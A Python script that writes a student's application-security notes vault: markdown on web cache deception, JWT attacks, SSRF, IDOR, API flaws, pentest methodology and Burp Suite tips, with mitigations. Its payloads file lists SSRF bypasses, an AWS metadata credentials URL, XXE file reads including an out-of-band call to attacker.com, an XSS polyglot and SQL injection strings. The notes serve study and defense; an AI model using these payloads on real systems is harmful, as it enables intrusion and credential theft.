import os

files = {
    "README.md": """# AppSec Research & Knowledge Vault

## Overview
Welcome to my Application Security (AppSec) knowledge repository. This vault serves as a centralized collection of my research, vulnerability analysis, exploit chain documentation, and defensive engineering strategies. 

## Research Philosophy
My approach to cybersecurity bridges the gap between the attacker mindset and engineering resilience. Having built systems like the **Sentinel Security Platform** and **AI Guardian Engine**, I analyze vulnerabilities not just to exploit them, but to understand root causes at the architectural level. Security is an engineering quality, not a patch.

## Objectives
- **Knowledge Consolidation:** Systematically document vulnerability classes, attack vectors, and real-world exploit chains.
- **Defensive Engineering:** Provide actionable mitigation strategies for developers, focusing on secure defaults.
- **Continuous Learning:** Track my progress in web application security, CTFs, and vulnerability research.

## Tooling & Expertise
- **Languages/Frameworks:** Node.js, React, Fastify
- **Databases:** PostgreSQL, Redis
- **Security Tools:** Burp Suite Professional, Wireshark, Nmap, Kali Linux
- **Infrastructure:** Docker, Linux
- **Domains:** API Security, JWT Authentication, RBAC, WebSockets

## Projects Integration Context
- **Sentinel Security Platform:** Multi-tenant SOC telemetry platform, heuristic intrusion detection engine, JWT auth, RBAC, API security.
- **AI Guardian Engine:** AI phishing/scam detection system, LLM integrations, NLP analysis, risk scoring.
- **SecurePass Analyzer:** Password security analyzer, entropy scoring, HaveIBeenPwned integration.

## Repository Structure
- `/Web-Cache-Deception` - Analysis of WCD mechanics, caching misconfigurations, and PortSwigger labs.
- `/JWT` - Deep dives into JSON Web Token vulnerabilities (alg confusion, null signatures).
- `/SSRF` - Server-Side Request Forgery mechanics, cloud metadata exfiltration, and chaining strategies.
- `/Access-Control` - Insecure Direct Object References (IDOR), Broken Access Control, and RBAC implementation flaws.
- `/API-Security` - API data exposure, mass assignment, and REST attack surfaces.
- `/Methodology` - My structured approach to web application pentesting and CTF exploit chains.
- `/Payloads` - Curated list of context-specific payloads for various injection and logic flaws.
- `/BurpSuite-Tips` - Optimization workflows, essential extensions, and efficient proxy configurations.

---
*Anant | B.Tech CSE Cybersecurity*
*GitHub: [anant720](https://github.com/anant720)*
""",
    "Web-Cache-Deception/README.md": """# Web Cache Deception (WCD)

## Overview
Web Cache Deception is a vulnerability where an attacker tricks a caching server (like a CDN, reverse proxy, or load balancer) into storing sensitive, user-specific content (such as a profile page, API response, or dashboard) which the attacker can subsequently access. This occurs due to discrepancies in how the cache server and the origin server parse and route the requested URI.

## Core Mechanism
The vulnerability manifests when three architectural conditions are met:
1. **Aggressive Edge Caching:** The edge server is configured to cache files based purely on static extensions (e.g., `.js`, `.css`, `.png`, `.jpg`).
2. **Permissive Origin Routing:** The origin server employs a routing mechanism that ignores unknown or trailing path extensions and resolves to the base endpoint (e.g., `/api/user/settings/nonexistent.css` maps to `/api/user/settings`).
3. **Session-Dependent Responses:** The origin server returns private data based on the authentication state (cookies, session tokens) of the requester.

## Attack Flow

```text
[ Attacker ]                               [ Victim ]
    │                                          │
    │ 1. Identifies permissive routing         │
    │    Target: /api/v1/profile               │
    │                                          │
    │ 2. Crafts malicious link                 │
    │    Link: /api/v1/profile/x.css           │
    │                                          │
    │ 3. Distributes link to Victim ───────────▶
    │                                          │ 4. Victim clicks link
    │                                          ▼
    │                                  [ CDN / Cache Node ]
    │                                          │
    │                                          │ 5. Cache miss. Forwards request
    │                                          │    (with Victim's cookies)
    │                                          ▼
    │                                  [ Origin Server ]
    │                                          │ 6. Ignores '/x.css'. 
    │                                          │    Returns Victim's private JSON
    │                                          │
    │                                  [ CDN / Cache Node ]
    │                                          │ 7. Sees '.css'. Caches response!
    │                                          │    Delivers to Victim.
    │                                          │
    │ 8. Requests cached file                  │
    │    GET /api/v1/profile/x.css             │
    ▼                                          │
[ CDN / Cache Node ] ◀─────────────────────────┘
    │
    │ 9. Cache HIT! Returns Victim's
    │    private JSON to Attacker
    ▼
[ Attacker ] (Data Exfiltrated)
```

## HTTP Request/Response Examples

**Victim's Request (Induced by Attacker):**
```http
GET /api/v1/profile/dummy.js HTTP/1.1
Host: target.com
Cookie: session_id=victim_secure_token
```

**Origin Response (Cached by CDN):**
```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: public, max-age=3600
X-Cache: MISS

{
  "user_id": 9942,
  "email": "victim@company.com",
  "pii": {
    "phone": "+1-555-0199",
    "credit_card_last4": "4242"
  }
}
```

## Lab Completion Notes: PortSwigger WCD
- **Objective:** Exploit WCD to expose a victim's API key.
- **Methodology:**
  1. Mapped cache behavior using Param Miner to identify cached extensions. Discovered `.js` was aggressively cached.
  2. Tested path mapping on `/my-account`. Found that `/my-account/test.js` loaded the account dashboard while maintaining a `200 OK` status.
  3. Delivered the payload `https://vulnerable.com/my-account/x.js` to the victim via a stored XSS/CSRF vector (or exploit server in the lab).
  4. Quickly polled `https://vulnerable.com/my-account/x.js` from my IP to retrieve the cached dashboard containing the API key.

## Defensive Engineering Insights
- **Strict Cache Keys:** Cache configurations must factor in the `Content-Type` header returned by the origin, not rely solely on the URL extension.
- **Cache-Control Headers:** Ensure all sensitive endpoints explicitly return `Cache-Control: private, no-store, must-revalidate`.
- **Strict Routing Enforcement:** Origin servers should return a `404 Not Found` for invalid paths instead of gracefully degrading to a base endpoint. Frameworks like Fastify should have `ignoreTrailingSlash` configured carefully.
""",
    "JWT/README.md": """# JSON Web Token (JWT) Security

## Overview
JWTs are the industry standard for stateless authentication. However, their security relies entirely on the integrity of the cryptographic signature. Implementation flaws in libraries, or misconfigurations in backend validation logic, frequently lead to critical authentication bypasses and vertical privilege escalation.

## Vulnerability Deep Dives

### 1. Algorithm Confusion (RS256 to HS256)
- **Root Cause Analysis:** The JWT specification requires the header to dictate the signing algorithm (e.g., `alg: RS256`). When a server expects an asymmetric RS256 signature (using a public/private key pair) but the backend JWT library fails to strictly enforce the algorithm type, it will blindly trust the `alg` parameter provided in the header.
- **The Exploit:** An attacker alters the header to specify `HS256` (a symmetric algorithm). The server, expecting RS256, uses the public key (which the attacker has obtained) for verification. Because the attacker changed the algorithm to HS256, the verification function treats the public key string as the HMAC symmetric secret. Since the attacker possesses this string, they can forge a valid signature.

**Attack Flow Diagram:**
```text
1. Extract Public Key (e.g., from /.well-known/jwks.json)
      │
2. Decode JWT Header & Payload
      │
3. Modify Header: {"alg": "RS256"} ──> {"alg": "HS256"}
      │
4. Modify Payload: {"role": "user"} ──> {"role": "admin"}
      │
5. Sign token using HMAC-SHA256, using the Public Key string as the secret
      │
6. Submit forged JWT to server. Server verifies successfully.
```

### 2. The 'None' Algorithm (CVE-2015-9256)
- **Root Cause Analysis:** The JWT standard defines a `none` algorithm for scenarios where token integrity is already guaranteed by other means. If the backend doesn't explicitly reject tokens with this algorithm, an attacker can submit an unsigned token that the server parses as valid.
- **Payload Construction:**
  ```json
  // Base64Url Encoded Header
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  // Decodes to: {"alg": "none", "typ": "JWT"}
  
  // Base64Url Encoded Payload
  eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0
  // Decodes to: {"sub": "admin", "iat": 1516239022}
  ```
  *Crucial syntax: The signature portion must be completely empty, resulting in a token that looks like `header.payload.` (note the trailing period).*

## Engineering Insights: Building Secure Auth
When engineering the **Sentinel Security Platform**, I architected the authentication flow to mitigate these exact flaws:
1. **Algorithm Hardcoding:** The Fastify validation middleware strictly hardcodes the expected algorithm:
   ```javascript
   // Secure implementation pattern
   jwt.verify(token, publicKey, { algorithms: ['RS256'] });
   ```
2. **Token Lifecycle Management:** Access tokens are short-lived (15 minutes).
3. **Storage Security:** To prevent XSS-based exfiltration, refresh tokens are stored exclusively in `HttpOnly`, `Secure`, `SameSite=Strict` cookies, never in `localStorage`.
""",
    "SSRF/README.md": """# Server-Side Request Forgery (SSRF)

## Overview
Server-Side Request Forgery (SSRF) allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This vulnerability effectively turns the target server into a proxy, enabling attackers to pivot into internal corporate networks, bypass edge firewalls, and exfiltrate highly sensitive cloud metadata.

## Attack Vectors & Impact Analysis

| Vector | Description | Potential Impact |
|--------|-------------|------------------|
| **Internal Network Scanning** | Forcing the server to request `http://192.168.0.x:8080/` or `http://localhost:6379/` (Redis). | Infrastructure mapping, exploiting internal unauthenticated services. |
| **Cloud Metadata Exfiltration** | Targeting cloud provider instance metadata services (IMDS). | Leaking IAM credentials, access tokens, and infrastructure configuration. |
| **Blind SSRF** | The application makes the request but does not return the response to the attacker. | Can be chained for DoS, internal network mapping via time delays, or triggering internal exploits. |

## The CTF Exploit Chain: SSRF to RCE
*Documenting an advanced exploit chain I executed during a CTF, demonstrating how a low-severity SSRF escalates to full system compromise.*

```text
[ Phase 1: SSRF ] ──▶ [ Phase 2: JWT ] ──▶ [ Phase 3: IDOR ] ──▶ [ Phase 4: XXE ] ──▶ [ Phase 5: RCE ]
```

1. **SSRF (The Foothold):** Identified a webhook testing endpoint vulnerable to SSRF. Bypassed simple filters using decimal IP encoding (`http://2130706433`). Used the SSRF to query an internal metadata endpoint, successfully leaking an internal API's public RSA key.
2. **JWT Algorithm Confusion (Privilege Escalation):** Utilized the leaked public key to forge an administrator JWT via RS256 to HS256 algorithm confusion. The server accepted the public key string as the HMAC secret.
3. **IDOR (Lateral Movement):** With administrative access, analyzed the user management API. Discovered an Insecure Direct Object Reference (IDOR) on an internal reporting feature by iterating sequential user IDs.
4. **XXE (File Exfiltration):** The reporting feature accepted XML input for custom formatting. Injected an Out-of-Band (OOB) XML External Entity payload to read the backend configuration files.
5. **RCE (System Compromise):** The extracted configuration files revealed hardcoded database credentials and a vulnerable deserialization endpoint, which was then leveraged to achieve Remote Code Execution.

## Defensive Engineering & Mitigation
- **Strict Allowlisting:** Implement a strict allowlist of domains/IPs for outbound requests. Never rely on denylists.
- **Network Segmentation (Zero Trust):** Ensure the web server resides in a DMZ and cannot route traffic to sensitive internal subnets unless explicitly required.
- **Disable Unused URI Schemas:** Prevent the application from utilizing schemas like `file://`, `dict://`, `gopher://`, or `ftp://`.
- **Cloud Hardening:** Enforce IMDSv2 (AWS), which requires a specific header and a PUT request to generate a token before accessing metadata, neutralizing simple GET-based SSRF attacks.
""",
    "Access-Control/README.md": """# Access Control & IDOR

## Overview
Access control vulnerabilities, primarily Insecure Direct Object References (IDOR) and Broken Access Control (BAC), occur when an application fails to cryptographically verify or enforce authorization checks on requested resources. Attackers exploit this by manipulating references (like database IDs, filenames, or usernames) to access data belonging to other users.

## Vulnerability Classifications

### 1. Horizontal Privilege Escalation
An attacker accesses resources belonging to a user with the same privilege level.
- **Example:** User A (`user_id=101`) modifies an API request to `GET /api/invoices?user_id=102` and views User B's invoices.

### 2. Vertical Privilege Escalation
A standard user accesses administrative or higher-privileged functions.
- **Example:** A standard user navigates directly to `/admin/dashboard` or modifies a POST payload during registration to include `"role": "admin"`.

### 3. Context-Dependent Access Control
Flaws in multi-tenant architectures where users might be admins in "Tenant A" but only standard users in "Tenant B", and the application fails to validate the context of the request.

## Methodology for Discovering IDORs
1. **Extensive Mapping:** Identify all endpoints that consume identifiers (in the URI path, query strings, request bodies, or custom headers).
2. **Multi-Account Matrix Testing:** Utilize Burp Suite's "Auth Matrix" extension or manually configure two separate, low-privileged accounts (User A and User B).
3. **Parameter Tampering:** Intercept User A's requests and swap identifiers with User B's to test horizontal escalation.
4. **Method Substitution:** If a strict endpoint like `GET /api/users/123` is properly protected, test alternate methods like `POST`, `PUT`, `PATCH`, or `DELETE` to the same endpoint.

## Engineering Insights from Sentinel Security Platform
During the development of the **Sentinel Security Platform** (a multi-tenant SOC telemetry platform), access control was a primary architectural focus.

- **The Anti-Pattern:** Enforcing role checks purely at the UI layer (hiding buttons) while leaving the underlying API routes unprotected.
- **Secure Architecture:** I implemented Role-Based Access Control (RBAC) at the middleware layer. Every API endpoint validates the user's session token, extracts the associated UUID, and explicitly queries PostgreSQL (with a Redis caching layer) to verify permissions against the requested resource.
- **Identifier Obfuscation:** Replaced sequential integer IDs with UUIDv4 across all database schemas. While UUIDs do not inherently fix access control flaws (if leaked, the resource is still accessible), they make automated IDOR enumeration and discovery exponentially harder.
""",
    "API-Security/README.md": """# API Security & Architecture

## Overview
Modern web applications are heavily decentralized, relying on REST, GraphQL, and gRPC APIs. Securing these interfaces requires strict input validation, robust authentication, and meticulous control over data exposure, as APIs often bypass traditional web application firewalls.

## Key Vulnerability Patterns

### 1. Mass Assignment (Auto-Binding)
- **Context:** Many modern frameworks (like Spring Boot or Express) allow developers to automatically bind incoming HTTP request parameters directly to backend database objects.
- **The Attack:** An attacker intercepts a legitimate request (like a profile update) and injects unauthorized fields, such as `{"is_admin": true}` or `{"wallet_balance": 9999}`.
- **Mitigation:** Implement strict Data Transfer Objects (DTOs) and allowlists. Never blindly map user input to internal models.

### 2. Excessive Data Exposure
- **Context:** Developers often build generic APIs that return full database records (e.g., `SELECT * FROM users`), relying on the frontend client (React/Vue) to filter out sensitive data before rendering.
- **The Attack:** An attacker intercepts the raw API JSON response using Burp Suite and extracts hidden fields like `ssn`, `password_hash`, or `internal_notes`.
- **Mitigation:** Implement strict response serialization at the backend. Only transmit the exact fields required by the UI component.

### 3. Improper Assets Management (Shadow APIs)
- **Context:** Outdated API versions (e.g., `/api/v1/`) are left operational alongside newer versions (`/api/v2/`) for backward compatibility, but lack the security patches applied to the newer infrastructure.
- **The Attack:** Bypassing WAFs, rate limits, or enhanced authorization checks by targeting the deprecated v1 endpoints.

## Engineering Context: Secure API Design
In building microservices with Node.js and Fastify, I enforce defense-in-depth API security:
1. **Schema Validation:** Utilizing libraries like `Ajv` or `Zod` to strictly validate the structure, type, and length of all incoming request bodies, headers, and query parameters before they reach business logic.
2. **Rate Limiting Architecture:** Implementing granular rate limiting backed by Redis. Different endpoints have different limits (e.g., `/login` allows 5 req/min, `/search` allows 100 req/min) to prevent brute-forcing and API exhaustion.
""",
    "Methodology/README.md": """# Pentesting & Vulnerability Research Methodology

## The Attacker Mindset
Effective security research requires a systematic, analytical approach. Before firing automated payloads or scanners, the focus must be on deeply understanding the application's business logic, architectural patterns, and underlying technology stack.

## Phase 1: Reconnaissance & Mapping
1. **Passive Recon:** Understand the target's external footprint (subdomains, open ports, historical data).
2. **Active Mapping:** Manually spider the application through a proxy (Burp Suite). Map every input vector, API endpoint, header, and parameter.
3. **Tech Stack Identification:** Analyze HTTP headers (`X-Powered-By`, `Server`), error messages, and frontend frameworks. Payload selection is heavily dependent on the stack (e.g., Node.js handles arrays in query parameters differently than PHP).

## Phase 2: Vulnerability Discovery Workflow
1. **Authentication & Authorization:** Test for session fixation, JWT weaknesses, IDORs, and Broken Access Control. This yields the highest impact.
2. **Input Validation:** Fuzz parameters for XSS, SQLi, SSRF, XXE, and Command Injection.
3. **Business Logic Flaws:** Analyze the application for race conditions, price manipulation, or bypasses in multi-step processes (e.g., skipping the payment step in a checkout flow).
4. **Configuration & Infrastructure:** Inspect CORS policies, Security Headers, and Cache configurations (Web Cache Deception/Poisoning).

## Phase 3: Exploitation & Chaining Strategy
A single vulnerability is rarely enough to compromise a hardened system. Context and chaining are critical.
- A Low-Impact SSRF + Open Redirect = High-Impact SSRF.
- An Information Disclosure + JWT weakness = Full Account Takeover.
- **Documentation:** Maintain meticulous notes during testing. If an endpoint behaves anomalously but doesn't immediately yield an exploit, document it. It often serves as the missing link for an exploit chain later in the engagement.
""",
    "Payloads/README.md": """# Context-Specific Payloads Vault

## Overview
A curated collection of context-specific payloads for testing various vulnerability classes. These are abstract, engineered examples used strictly for educational, research, and authorized testing purposes.

## Server-Side Request Forgery (SSRF)
Targeting internal services and bypassing naive filters.
- **Localhost Variations:**
  ```text
  http://127.0.0.1
  http://0.0.0.0
  http://localhost
  http://[::1]
  http://2130706433 (Decimal representation)
  http://0x7F000001 (Hex representation)
  ```
- **Cloud Metadata (AWS):**
  ```text
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

## XML External Entity (XXE)
- **Classic Local File Inclusion (LFI):**
  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```
- **Out-of-Band (OOB) Exfiltration (requires attacker server):**
  ```xml
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe; ]>
  ```

## Cross-Site Scripting (XSS)
- **Polyglot Payload (Context-agnostic):**
  ```javascript
  javascript://%250Aalert(1)//"onclick=alert(1)//<svg/onload=alert(1)>
  ```

## JSON Web Tokens (JWT)
- **The 'None' Algorithm Header:**
  ```text
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  ```
  *(Decodes to: `{"alg":"none","typ":"JWT"}`)*

## SQL Injection (PostgreSQL Context)
- **Time-based Blind:** 
  ```sql
  1; SELECT pg_sleep(5)--
  ```
- **Version Identification:** 
  ```sql
  UNION SELECT null, version()--
  ```

*Note: Payloads must always be adapted to the specific application context, encoding requirements (URL encode, Base64), and potential WAF interference.*
""",
    "BurpSuite-Tips/README.md": """# Burp Suite Pro Workflow Optimization

## Overview
Efficient utilization of Burp Suite separates junior testers from experienced researchers. This section details workflows to minimize noise and maximize vulnerability discovery.

## Workflow Efficiency & Proxy Management
- **Target Scope:** Always configure the target scope strictly. Enable `Drop all out-of-scope requests` in the proxy settings. This keeps the HTTP history clean, prevents accidental out-of-scope testing, and significantly reduces memory consumption.
- **Repeater Organization:** Name Repeater tabs logically based on the vulnerability being tested and the context (e.g., `IDOR - User Profile POST`, `SSRF - Webhook Update`).
- **Match and Replace Rules:** Utilize `Proxy -> Options -> Match and Replace` to automatically modify traffic on the fly. Useful for:
  - Bypassing WAFs by injecting `X-Forwarded-For: 127.0.0.1` on every request.
  - Automatically upgrading low-privileged session cookies to high-privileged ones during authorization testing.

## Essential Extensions (BApp Store)
1. **Autorize:** Crucial for automating IDOR and broken access control testing. Feed it a low-privileged session token, browse the application as an administrator, and Autorize will flag endpoints that fail to enforce privilege separation.
2. **JSON Web Token Attacker:** Automates signing, algorithm confusion (RS256 to HS256), and none-algorithm attacks on JWTs.
3. **Param Miner:** Essential for discovering hidden, unlinked parameters and HTTP headers that might lead to Web Cache Poisoning, Web Cache Deception, or hidden debug features.

## Traffic Analysis & Intruder Tips
- **Grep - Extract:** When fuzzing multi-step processes or testing SSRF, use Intruder's `Grep - Extract` feature to pull out specific data (like error strings or leaked tokens) from responses.
- **BChecks:** Utilize the "BCheck" feature in modern Burp Suite versions to write custom active and passive checks for specific framework vulnerabilities identified during initial recon.
- Pay close attention to subtle differences in response lengths, HTTP status codes, and timing delays when fuzzing inputs.
"""
}

def create_structure():
    base_dir = r"c:\Users\Anant\OneDrive\Desktop\Appsec-Notes"
    os.makedirs(base_dir, exist_ok=True)
    
    for filepath, content in files.items():
        full_path = os.path.join(base_dir, filepath.replace('/', os.sep))
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content.strip())
            
    print("Successfully generated knowledge base in " + base_dir)

if __name__ == "__main__":
    create_structure()
